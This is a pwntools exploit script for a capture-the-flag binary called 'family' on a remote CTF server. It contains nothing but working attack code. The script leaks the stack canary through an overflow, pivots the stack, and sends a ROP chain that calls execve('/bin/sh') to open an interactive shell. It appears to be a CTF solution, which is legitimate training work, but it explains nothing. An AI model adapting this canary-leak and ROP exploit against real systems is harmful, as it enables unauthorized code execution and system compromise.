from pwn import *
context.arch = 'amd64'

#context.terminal = ['tmux', 'splitw', '-h']
#r = process('./family')
r = remote('ctf.adl.tw', 11006)
#gdb.attach(r)

'''some addr'''
read_addr = 0x400c80 # mov rdi,0; call read
fake_rbp = 0x6b7010

'''rop gadgets'''
pop_rdi = 0x400696
pop_rdx_pop_rsi = 0x44c929
pop_rax = 0x44a30c
ret = 0x4001c3
syscall = 0x40132c
#pop_rdx = 0x44a365
pop_rsi = 0x410713
mov_rdi_rsi = 0x4476db

'''child'''
r.recvuntil('Where is my daddy QQ\n')
r.send('a'*0x19)
r.recv(0x19)
canary = b'\x00' + r.recv(7)
print(f'canary leak : {hex(u64(canary, endian="little"))}')

'''parent'''
r.recvuntil('?')
payload1 = flat('b'*24, canary, fake_rbp+0x10, pop_rdx_pop_rsi, 0x80, fake_rbp, ret, read_addr) # stack pivot
payload2 = flat('a'*8, canary, fake_rbp, pop_rdi, fake_rbp, pop_rsi, '/bin/sh\0', mov_rdi_rsi, pop_rdx_pop_rsi, 0x0, 0x0, pop_rax, 0x3b, syscall) # ROP
r.send(payload1)
r.send(payload2)


r.interactive()
